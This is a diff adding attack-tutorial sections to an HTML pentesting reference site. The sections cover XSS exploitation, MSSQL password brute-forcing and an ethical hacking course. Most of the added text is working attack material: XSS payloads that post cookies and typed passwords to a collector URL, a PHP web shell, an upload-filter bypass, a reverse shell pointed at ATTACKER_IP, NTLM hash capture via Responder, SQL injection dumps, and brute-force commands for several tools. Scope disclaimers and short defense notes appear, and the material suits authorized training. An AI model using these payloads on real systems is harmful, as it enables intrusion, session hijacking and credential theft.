@@ -725,6 +725,10 @@ sudo chown -R $USER:$USER /opt/Probable-Wordlists</pre>
                 <i class="fas fa-layer-group nav-icon"></i>
                 <span>Foundation Setup</span>
             </div>
+            <div class="nav-item" data-target="ethical-hacking">
+                <i class="fas fa-shield-alt nav-icon"></i>
+                <span>Ethical Hacking Course</span>
+            </div>
         </div>
         
         <div class="nav-section">
@@ -749,6 +753,7 @@ sudo chown -R $USER:$USER /opt/Probable-Wordlists</pre>
                 <i class="fas fa-database nav-icon"></i>
                 <span>SQL Injection</span>
             </div>
+           
             <div class="nav-item" data-target="xss">
                 <i class="fas fa-code nav-icon"></i>
                 <span>XSS & CSRF</span>
@@ -760,6 +765,10 @@ sudo chown -R $USER:$USER /opt/Probable-Wordlists</pre>
             <div class="nav-item" data-target="file-upload">
                 <i class="fas fa-upload nav-icon"></i>
                 <span>File Upload</span>
+            </div>
+             <div class="nav-item" data-target="mssql">
+                <i class="fas fa-server nav-icon"></i>
+                <span>MSSQL (1433) Password Cracking</span>
             </div>
         </div>
         
@@ -1813,6 +1822,247 @@ querySelector + .innerHTML</pre>
                 </div>
             </div>
         </div>
+        <div class="accordion">
+            <div class="accordion-header">
+                <div class="accordion-title">
+                    <span class="step-number">4.11</span>
+                    🔐 Cross-Site Scripting (XSS) – Complete Exploitation Guide
+                </div>
+                <i class="fas fa-chevron-down accordion-icon"></i>
+            </div>
+            <div class="accordion-content">
+                <div class="accordion-body">
+                    
+                    <div class="section">
+                        <h3>Scope</h3>
+                        <ul style="margin-left:20px;">
+                            <li>Authorized labs only (bWAPP, PortSwigger, DVWA, test VMs, bug bounty programs)</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="section">
+                        <h3>Environment Setup (Before Anything)</h3>
+                        <div class="code-block">
+                            <span class="code-label">Attacker Machine</span>
+                            <pre>OS: Kali Linux
+Tools:
+- Burp Suite
+- Netcat
+- Metasploit
+- Responder
+- Firefox / Chromium</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Vulnerable Application (Lab)</span>
+                            <pre>bWAPP (bee-box)
+PortSwigger Academy labs
+DVWA / test VMs</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3>Understanding the Entry Point</h3>
+                        <ul style="margin-left:20px;">
+                            <li>Comment fields</li>
+                            <li>Profile bio</li>
+                            <li>File upload filename</li>
+                            <li>Contact forms</li>
+                            <li>Admin panels (Blind XSS)</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="section">
+                        <h3>XSS via File Upload – FULL FLOW</h3>
+                        <div class="code-block">
+                            <span class="code-label">Step 1: Identify File Upload Function</span>
+                            <pre>bWAPP → Choose Your Bug → Unrestricted File Upload
+Security level: High</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Step 2: Malicious Filename Payload</span>
+                            <pre>"&gt;&lt;img src=x onerror=alert(1)&gt;</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Step 3: Rename Any File</span>
+                            <pre>mv test.jpg '"&gt;&lt;img src=x onerror=alert(1)&gt;.jpg'</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Step 4: Upload the File</span>
+                            <pre>Click Upload
+If popup appears → XSS confirmed</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3>Bypassing File Extension Filters (.php → .php.jpg)</h3>
+                        <div class="code-block">
+                            <span class="code-label">Why This Works</span>
+                            <pre>Some servers validate only last extension.</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Step 1: Create PHP Shell</span>
+                            <pre>nano shell.php
+&lt;?php system($_GET['cmd']); ?&gt;</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Step 3: Rename to Bypass Filter</span>
+                            <pre>mv shell.php shell.php.jpg</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Step 4: Upload File</span>
+                            <pre>Upload shell.php.jpg
+Copy uploaded file URL
+Example:
+http://TARGET/uploads/shell.php.jpg</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Step 5: Test Command Execution</span>
+                            <pre>http://TARGET/uploads/shell.php.jpg?cmd=id
+Output → Command execution confirmed</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3>Reverse Shell via XSS (COMPLETE FLOW)</h3>
+                        <div class="code-block">
+                            <span class="code-label">Step 1–2: Prepare Reverse Shell</span>
+                            <pre>cp /usr/share/webshells/php/php-reverse-shell.php ReverseXSS.php
+nano ReverseXSS.php
+$ip = 'ATTACKER_IP';
+$port = 1234;</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Step 3: Bypass Upload Filter</span>
+                            <pre>mv ReverseXSS.php ReverseXSS.php.jpg</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Step 4: Upload</span>
+                            <pre>Upload ReverseXSS.php.jpg
+Copy uploaded URL</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Step 5: Netcat Listener</span>
+                            <pre>nc -lvnp 1234</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Step 6: Trigger via Stored XSS</span>
+                            <pre>&lt;script&gt;
+fetch("http://TARGET/uploads/ReverseXSS.php.jpg");
+&lt;/script&gt;</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Step 7: Receive Shell</span>
+                            <pre>connect to [ATTACKER_IP] from TARGET_IP
+Reverse shell obtained</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3>Blind XSS + Burp Collaborator (FULL STEPS)</h3>
+                        <div class="code-block">
+                            <span class="code-label">Step 1–3</span>
+                            <pre>Open Burp → Burp Collaborator Client → Copy URL
+Inject:
+&lt;script&gt;
+fetch('https://COLLAB_URL', { method: 'POST', mode: 'no-cors', body: document.cookie });
+&lt;/script&gt;
+Poll now → Look for HTTP interaction</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3>Session Hijacking (Step-By-Step)</h3>
+                        <div class="code-block">
+                            <span class="code-label">Use Captured Cookie</span>
+                            <pre>Example: PHPSESSID=abc123xyz
+Burp → Proxy → Intercept ON
+Reload target page
+Replace Cookie: PHPSESSID=abc123xyz
+Forward → Logged in as victim</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3>Credential Theft via Stored XSS</h3>
+                        <div class="code-block">
+                            <span class="code-label">Payload</span>
+                            <pre>&lt;input name=username id=username&gt;
+&lt;input type=password
+onchange="fetch('https://COLLAB_URL',{ method:'POST', mode:'no-cors', body:username.value+':'+this.value });"&gt;</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Steps</span>
+                            <pre>Inject into comment/profile
+Wait for admin/user login
+View captured creds in Burp Collaborator</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3>CSRF via XSS – Full Chain</h3>
+                        <div class="code-block">
+                            <span class="code-label">Endpoint</span>
+                            <pre>http://TARGET/csrf_1.php?password_new=ignite&amp;password_conf=ignite&amp;action=change</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Embed</span>
+                            <pre>&lt;img src="http://TARGET/csrf_1.php?password_new=ignite&amp;password_conf=ignite&amp;action=change"&gt;</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3>NTLM Hash Capture via XSS (FULL)</h3>
+                        <div class="code-block">
+                            <span class="code-label">Steps</span>
+                            <pre>responder -I eth0
+Inject:
+&lt;iframe src="http://ATTACKER_IP/scriptlet.html"&gt;&lt;/iframe&gt;
+Wait → NTLM hash captured
+cd /usr/share/responder/logs
+john --wordlist=pass.txt HTTP-NTLMv2-*.txt</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3>XSS → SQL Injection (FULL DETAIL)</h3>
+                        <div class="code-block">
+                            <span class="code-label">Find SQLi</span>
+                            <pre>?title=' order by 7--+
+?title=' union select 1,2,3,4,5,6,7--+</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Convert XSS to HEX</span>
+                            <pre>&lt;script&gt;alert("XSS SQLi")&lt;/script&gt;
+0x3c7363726970743e616c65727428225853532053514c6922293c2f7363726970743e</pre>
+                        </div>
+                        <div class="code-block">
+                            <span class="code-label">Inject HEX Payload</span>
+                            <pre>?title=' union select 1,HEX_PAYLOAD,3,4,5,6,7--+</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="section">
+                        <h3>Final Website Structure (Recommended)</h3>
+                        <div class="code-block">
+                            <span class="code-label">XSS Exploitation Topics</span>
+                            <pre>XSS Exploitation
+├── Basics
+├── File Upload XSS
+├── Extension Bypass
+├── Reverse Shell via XSS
+├── Blind XSS
+├── Burp Collaborator
+├── Session Hijacking
+├── Credential Theft
+├── CSRF Chaining
+├── NTLM Hash Capture
+└── XSS to SQL Injection</pre>
+                        </div>
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
         
         <!-- IDOR -->
         <div class="accordion-container" id="idor">
@@ -2217,6 +2467,948 @@ docker run --rm -v $(pwd):/data projectdiscovery/katana:latest -u https://exampl
                     <div class="code-block">
                         <span class="code-label">Custom Header</span>
                         <pre>katana -u https://target -H 'User-Agent: Mozilla/5.0' -o katana_headers.txt -silent</pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="accordion-container" id="mssql">
+            <div class="content-header">
+                <h1>🔐 MSSQL Password Cracking (Port 1433) – Step-by-Step Pentesting Guide</h1>
+                <p>Usage scope: Authorized labs, internal assessments, red-team simulations, and bug-bounty programs only.</p>
+            </div>
+            
+            <div class="accordion open">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.1</span>
+                        Introduction
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>MSSQL Overview</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Microsoft SQL Server commonly runs on TCP port 1433.</li>
+                                <li>High-value internal target storing sensitive data, often with elevated privileges.</li>
+                                <li>SQL Authentication enables username/password logins and is a primary attack surface in pentests.</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.2</span>
+                        MITRE ATT&CK Mapping
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Techniques</h3>
+                            <div class="code-block">
+                                <span class="code-label">IDs & Names</span>
+                                <pre>T1110.001  Brute Force – Password Guessing
+T1046      Network Service Scanning
+T1078      Valid Accounts</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.3</span>
+                        MSSQL Basics (Port 1433)
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Authentication Types</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Windows Authentication (AD-based, more secure)</li>
+                                <li>SQL Authentication (username/password, often weak)</li>
+                            </ul>
+                        </div>
+                        <div class="section">
+                            <h3>Primary Attack Surface</h3>
+                            <p>SQL authentication is the primary focus for credential brute-forcing in authorized assessments.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.4</span>
+                        Enumeration – Confirm MSSQL Service
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Nmap Detection</h3>
+                            <div class="code-block">
+                                <span class="code-label">Command</span>
+                                <pre>nmap -p 1433 -sV 192.168.1.80</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Explanation</span>
+                                <pre>-p 1433 → Scan MSSQL default port
+-sV     → Detect service & version</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Expected Result</span>
+                                <pre>1433/tcp open  ms-sql-s
+Service identified as Microsoft SQL Server
+If port is closed → brute force is not possible</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.5</span>
+                        Preparing Wordlists (Critical Mid-Step)
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Create Username File</h3>
+                            <div class="code-block">
+                                <span class="code-label">user.txt</span>
+                                <pre>nano user.txt
+sa
+admin
+sqladmin
+dbadmin</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Create Password File</h3>
+                            <div class="code-block">
+                                <span class="code-label">pass.txt</span>
+                                <pre>nano pass.txt
+password
+admin
+123456
+P@ssw0rd
+sa@123</pre>
+                            </div>
+                            <p>These files are reused across all tools below.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.6</span>
+                        Brute Force – Hydra
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Command</h3>
+                            <div class="code-block">
+                                <span class="code-label">Hydra MSSQL</span>
+                                <pre>hydra -L user.txt -P pass.txt 192.168.1.80 mssql</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Parameter Breakdown</h3>
+                            <div class="code-block">
+                                <span class="code-label">Options</span>
+                                <pre>-L user.txt   → Username list
+-P pass.txt   → Password list
+192.168.1.80  → Target IP
+mssql         → MSSQL protocol module</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Success Output Example</h3>
+                            <div class="code-block">
+                                <span class="code-label">Valid Credentials</span>
+                                <pre>[1433][mssql] host: 192.168.1.80  login: sa  password: P@ssw0rd</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Detection / Defense</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Monitor Event ID 18456 (failed logins)</li>
+                                <li>Enable SQL audit logs</li>
+                                <li>Apply IP-based rate limiting</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.7</span>
+                        Brute Force – Metasploit MSSQL Login Scanner
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Steps</h3>
+                            <div class="code-block">
+                                <span class="code-label">Launch & Configure</span>
+                                <pre>msfconsole
+use auxiliary/scanner/mssql/mssql_login
+set rhosts 192.168.1.80
+set user_file user.txt
+set pass_file pass.txt
+set verbose false
+run</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Success Output</span>
+                                <pre>[+] 192.168.1.80:1433 - Login Successful: sa:P@ssw0rd</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Defensive Control</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Correlate scan → login attempts</li>
+                                <li>Block attacker IP after threshold failures</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.8</span>
+                        Brute Force – Medusa
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Command</h3>
+                            <div class="code-block">
+                                <span class="code-label">Medusa MSSQL</span>
+                                <pre>medusa -h 192.168.1.80 -U user.txt -P pass.txt -M mssql | grep "ACCOUNT FOUND"</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Explanation</h3>
+                            <div class="code-block">
+                                <span class="code-label">Options</span>
+                                <pre>-h           → Target host
+-U           → Username file
+-P           → Password file
+-M mssql     → MSSQL module
+grep "ACCOUNT FOUND" → Show only valid creds</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Example Output</span>
+                                <pre>ACCOUNT FOUND: [mssql] Host: 192.168.1.80 User: sa Password: P@ssw0rd</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.9</span>
+                        Brute Force – NetExec (nxc)
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Command</h3>
+                            <div class="code-block">
+                                <span class="code-label">NetExec MSSQL</span>
+                                <pre>nxc mssql 192.168.1.80 -u user.txt -p pass.txt --local-auth | grep [+]</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Explanation</h3>
+                            <div class="code-block">
+                                <span class="code-label">Options</span>
+                                <pre>mssql        → Target service
+--local-auth → SQL authentication
+grep [+]     → Filter valid logins</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.10</span>
+                        Brute Force – Ncrack
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Command</h3>
+                            <div class="code-block">
+                                <span class="code-label">Ncrack MSSQL</span>
+                                <pre>ncrack -U user.txt -P pass.txt 192.168.1.80 -p 1433</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Explanation</h3>
+                            <div class="code-block">
+                                <span class="code-label">Options</span>
+                                <pre>-U → Username list
+-P → Password list
+-p 1433 → MSSQL port</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.11</span>
+                        Brute Force – Patator
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Command</h3>
+                            <div class="code-block">
+                                <span class="code-label">Patator MSSQL</span>
+                                <pre>patator mssql_login host=192.168.1.80 user=FILE0 0=user.txt password=FILE1 1=pass.txt</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Optional Filters</h3>
+                            <div class="code-block">
+                                <span class="code-label">Ignore Codes</span>
+                                <pre>-x ignore:code=530</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.12</span>
+                        Brute Force – Nmap NSE (ms-sql-brute)
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Command</h3>
+                            <div class="code-block">
+                                <span class="code-label">NSE Brute Force</span>
+                                <pre>nmap -p1433 --script ms-sql-brute.nse --script-args userdb=user.txt,passdb=pass.txt 192.168.1.80</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Use Case</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Early-stage recon</li>
+                                <li>Identify weak/default credentials quickly</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.13</span>
+                        Post-Exploitation (After Credentials)
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Connect & Enumerate</h3>
+                            <div class="code-block">
+                                <span class="code-label">Tools</span>
+                                <pre>sqsh
+impacket-mssqlclient
+Metasploit MSSQL modules</pre>
+                            </div>
+                            <ul style="margin-left:20px;">
+                                <li>Enumerate databases</li>
+                                <li>Assess privilege level (e.g., sysadmin role)</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">DB.14</span>
+                        Defense-in-Depth Summary
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Controls</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Disable SQL authentication if possible</li>
+                                <li>Enforce strong password policies</li>
+                                <li>Lock out accounts after failures</li>
+                                <li>Restrict port 1433 exposure</li>
+                                <li>Monitor login failures and scan-to-login sequences</li>
+                            </ul>
+                        </div>
+                        <div class="section">
+                            <h3>Website Menu Structure (Ready to Paste)</h3>
+                            <div class="code-block">
+                                <span class="code-label">MSSQL Pentesting Topics</span>
+                                <pre>MSSQL Pentesting
+├── Introduction
+├── MITRE Mapping
+├── MSSQL Basics (Port 1433)
+├── Enumeration
+│   └── Nmap Scan
+├── Brute Force Attacks
+│   ├── Hydra
+│   ├── Metasploit
+│   ├── Medusa
+│   ├── NetExec
+│   ├── Ncrack
+│   ├── Patator
+│   └── Nmap NSE
+├── Post-Exploitation
+└── Defensive Strategies</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="accordion-container" id="ethical-hacking">
+            <div class="content-header">
+                <h1>🛡️ Ethical Hacking Course – Complete Deep-Step Practical Guide</h1>
+                <p>Extracted & expanded from PDF. Authorized labs, CTFs, internal assessments, bug bounty only.</p>
+            </div>
+            
+            <div class="accordion open">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">EH.1</span>
+                        Introduction to Ethical Hacking
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>What Ethical Hacking Means</h3>
+                            <p>Authorized process of identifying vulnerabilities in systems, networks, and applications to improve security.</p>
+                        </div>
+                        <div class="section">
+                            <h3>Types of Hackers</h3>
+                            <ul style="margin-left:20px;">
+                                <li>White Hat – Authorized security testers</li>
+                                <li>Black Hat – Malicious attackers</li>
+                                <li>Grey Hat – No permission but no malicious intent</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">EH.2</span>
+                        Penetration Testing Methodology
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Standard Phases</h3>
+                            <div class="code-block">
+                                <span class="code-label">Flow</span>
+                                <pre>Reconnaissance
+→ Scanning
+→ Enumeration
+→ Exploitation
+→ Privilege Escalation
+→ Post-Exploitation
+→ Reporting</pre>
+                            </div>
+                            <p>This flow is followed in every module below.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">EH.3</span>
+                        Footprinting & Reconnaissance
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Passive Reconnaissance</h3>
+                            <div class="code-block">
+                                <span class="code-label">WHOIS</span>
+                                <pre>whois example.com</pre>
+                            </div>
+                            <ul style="margin-left:20px;">
+                                <li>Domain owner, email addresses, name servers</li>
+                            </ul>
+                            <div class="code-block">
+                                <span class="code-label">DNS Enumeration</span>
+                                <pre>nslookup example.com
+dig example.com</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Google Dorking</span>
+                                <pre>site:example.com filetype:pdf
+site:example.com inurl:admin
+intitle:"index of"</pre>
+                            </div>
+                            <p>These reveal sensitive exposed files.</p>
+                        </div>
+                        <div class="section">
+                            <h3>Active Reconnaissance</h3>
+                            <div class="code-block">
+                                <span class="code-label">Ping Sweep</span>
+                                <pre>ping example.com</pre>
+                            </div>
+                            <p>Confirms host is alive.</p>
+                            <div class="code-block">
+                                <span class="code-label">More Tools</span>
+                                <pre>See Web Enumeration and Network Scanning sections</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">EH.4</span>
+                        Scanning Networks (Nmap)
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Basic Scan</h3>
+                            <div class="code-block">
+                                <span class="code-label">Ping/Default</span>
+                                <pre>nmap 192.168.1.10</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Full TCP Scan</h3>
+                            <div class="code-block">
+                                <span class="code-label">All Ports</span>
+                                <pre>nmap -p- 192.168.1.10</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Service & Version Detection</h3>
+                            <div class="code-block">
+                                <span class="code-label">-sV</span>
+                                <pre>nmap -sV 192.168.1.10</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>OS Detection</h3>
+                            <div class="code-block">
+                                <span class="code-label">-O</span>
+                                <pre>nmap -O 192.168.1.10</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Aggressive Scan</h3>
+                            <div class="code-block">
+                                <span class="code-label">-A</span>
+                                <pre>nmap -A 192.168.1.10</pre>
+                            </div>
+                            <ul style="margin-left:20px;">
+                                <li>OS detection</li>
+                                <li>Service versions</li>
+                                <li>Default scripts</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">EH.5</span>
+                        Enumeration
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>SMB Enumeration</h3>
+                            <div class="code-block">
+                                <span class="code-label">NSE</span>
+                                <pre>nmap --script smb-enum-shares -p 445 192.168.1.10</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>FTP Enumeration</h3>
+                            <div class="code-block">
+                                <span class="code-label">Anonymous</span>
+                                <pre>nmap --script ftp-anon -p 21 192.168.1.10</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>User Enumeration (Linux)</h3>
+                            <div class="code-block">
+                                <span class="code-label">Local</span>
+                                <pre>cat /etc/passwd</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>SNMP Enumeration</h3>
+                            <div class="code-block">
+                                <span class="code-label">SNMPv2c</span>
+                                <pre>snmpwalk -v2c -c public 192.168.1.10</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">EH.6</span>
+                        Vulnerability Analysis
+                    </div>
+                    <i class="fas a-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Nmap NSE (vuln)</h3>
+                            <div class="code-block">
+                                <span class="code-label">Broad Check</span>
+                                <pre>nmap --script vuln 192.168.1.10</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Nikto (Web)</h3>
+                            <div class="code-block">
+                                <span class="code-label">Scan</span>
+                                <pre>nikto -h http://192.168.1.10</pre>
+                            </div>
+                            <ul style="margin-left:20px;">
+                                <li>Dangerous files, misconfigurations, outdated software</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">EH.7</span>
+                        Web Application Attacks
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>SQL Injection</h3>
+                            <div class="code-block">
+                                <span class="code-label">Test Input</span>
+                                <pre>' OR 1=1-- -</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Database Enumeration</span>
+                                <pre>' UNION SELECT database(),user()-- -</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Dump Data</span>
+                                <pre>' UNION SELECT username,password FROM users-- -</pre>
+                            </div>
+                            <p>See the SQL Injection Master Guide for detailed workflows.</p>
+                        </div>
+                        <div class="section">
+                            <h3>Cross-Site Scripting (XSS)</h3>
+                            <p>Use the dedicated section for the complete exploitation workflow.</p>
+                        </div>
+                        <div class="section">
+                            <h3>File Upload Vulnerability</h3>
+                            <div class="code-block">
+                                <span class="code-label">Shell Creation</span>
+                                <pre>nano shell.php
+&lt;?php system($_GET['cmd']); ?&gt;</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Bypass Extension Filter</span>
+                                <pre>mv shell.php shell.php.jpg</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Execute</span>
+                                <pre>http://TARGET/uploads/shell.php.jpg?cmd=whoami</pre>
+                            </div>
+                            <p>See File Upload section for bypass strategies and verification.</p>
+                        </div>
+                    </div>
